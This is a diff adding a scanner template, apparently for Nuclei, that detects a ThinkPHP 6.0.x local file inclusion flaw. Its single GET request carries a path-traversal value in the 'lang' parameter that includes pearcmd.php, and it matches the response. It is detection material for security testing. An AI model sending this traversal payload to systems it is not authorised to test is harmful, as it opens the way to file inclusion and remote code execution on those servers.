@@ -1,0 +1,28 @@
+id: local-thinkphp-tp6-lang-lfi-probe
+
+info:
+  name: ThinkPHP 6.x lang Parameter LFI Detection (CVE-2022-25064)
+  author: pentest-platform
+  severity: critical
+  description: |
+    ThinkPHP 6.0.x (< 6.0.13) with multi-language enabled allows arbitrary local PHP file
+    inclusion via the `lang` query parameter. Detects vulnerability by including
+    /usr/local/lib/php/pearcmd.php via traversal — the PEAR warning output confirms LFI.
+    Requires register_argc_argv=On (default in Docker PHP images).
+  reference:
+    - https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+  tags: safe-poc,thinkphp,tp6,lfi,cve,cve2022,pearcmd
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?lang=../../../../../../../../../../../usr/local/lib/php/pearcmd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pearcmd.php"
+      - type: status
+        status:
+          - 200
